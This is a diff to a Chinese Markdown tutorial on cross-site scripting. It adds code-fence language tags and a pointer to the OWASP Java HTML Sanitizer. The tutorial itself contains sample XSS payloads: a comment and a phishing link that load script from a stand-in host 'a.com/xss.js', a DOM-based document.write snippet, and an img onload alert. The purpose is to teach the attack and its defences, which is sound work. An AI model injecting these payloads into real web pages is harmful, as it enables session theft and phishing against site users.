@@ -30,7 +30,7 @@ Web程序将数据直接作为HTML显示（未进行HTML特殊字符转义、scr
 1. 恶意用户A发现某个博客系统B对博文的评论未做严格检查，而允许注入Javascript代码。
 1. 恶意用户A找到一个知名度高的一篇访问量大的博文，发表以下评论代码：
 
-    ```
+    ```html
     <script src="http://a.com/xss.js"></script>
     楼主的帖子实在是写得太好了。文笔流畅,修辞得体,深得魏晋诸朝遗风,
     更将唐风宋骨发扬得入木三分,能在有生之年看见楼主的这个帖子。
@@ -39,7 +39,7 @@ Web程序将数据直接作为HTML显示（未进行HTML特殊字符转义、scr
 
 1. 博客系统B使用以下方式显示回帖（JSP语法）：
 
-    ```
+    ```jsp
     回帖人：<%=comment.userId %>，回帖内容是：<%= comment.content %>
     ```
 
@@ -54,12 +54,12 @@ Web程序将数据直接作为HTML显示（未进行HTML特殊字符转义、scr
 
 1. 恶意用户A搜索、验证并确信某系统B在访问 <code>http://b.com/welcome.do?user=zhang3</code> 时，是以以下方式显示URL中的用户名的（JSP语法）：
 
-    ```
+    ```jsp
     welcome <%=param["user"] %>!
     ```
 1. 恶意用户A就利用此漏洞，以系统B的名义向多个用户发送包含以下连接的HTML邮件，并诱导用户点击该链接：
 
-    ```
+    ```html
     {系统B}温馨提醒您：XXX 想加您好友，请点击
     <a href="http://b.com/welcome.do?user=zhang3<script src='http://a.com/xss.js'></script>">此处</a>
     进行处理！
@@ -74,7 +74,7 @@ Web程序将数据直接作为HTML显示（未进行HTML特殊字符转义、scr
 
 也即，在 Reflected XSS Attacks 的攻击流程示例的第二步中的代码替换为以下方式：
 
-```
+```html
  welcome <script>
 document.write(document.location.href.substring(document.location.href.indexOf("user=")+5));
 </script>!
@@ -87,7 +87,7 @@ document.write(document.location.href.substring(document.location.href.indexOf("
 
 1. 客户端：来自用户输入，却未作安全检查。
 
-    ```
+    ```html
     <img src="https://www.owasp.org/skins/monobook/ologo.png" onload="alert('XSS');" >
     ```
 
@@ -144,12 +144,18 @@ document.write(document.location.href.substring(document.location.href.indexOf("
 
 
 ## 工具
+* [OWASP Java HTML Sanitizer Project](https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project)
 * [OWASP AntiSamy](https://www.owasp.org/index.php/Category:OWASP_AntiSamy_Project)
 * [Nikto2](http://www.cirt.net/nikto2) - 开源的Web服务器扫描工具
 * [nessus](http://www.tenable.com/products/nessus) - 漏洞扫描工具
 * [Microsoft Web Protection Library](http://wpl.codeplex.com/) - .Net 平台下的安全工具
 * [ValidateRequest](http://msdn.microsoft.com/en-us/library/ms972969.aspx#securitybarriers_topic6) - .Net 平台内建功能，可以提供部分安全保护措施
 * [OWASP ESAPI](https://www.owasp.org/index.php/ESAPI) - OWASP Enterprise Security API
+
+
+## OWASP Java HTML Sanitizer Project 使用示例
+
+参考 [这里](https://github.com/btpka3/btpka3.github.com/blob/master/owasp/first-AntiSamy/src/main/java/me/test/AntiSamyTest.java)
 
 
 ## OWASP AntiSamy 使用示例
